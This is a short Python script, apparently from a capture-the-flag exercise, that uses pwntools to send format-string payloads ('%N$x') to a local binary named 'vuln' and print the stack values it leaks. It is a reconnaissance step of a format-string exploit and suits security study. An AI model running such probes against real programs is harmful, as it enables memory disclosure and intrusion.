from pwn import *

for i in range(1,35):
    payload = f'%{i}$x'.encode()
    io = process('./vuln')
    io.sendline(payload)
    io.recvline()
    print(io.recvline())
    #io.close()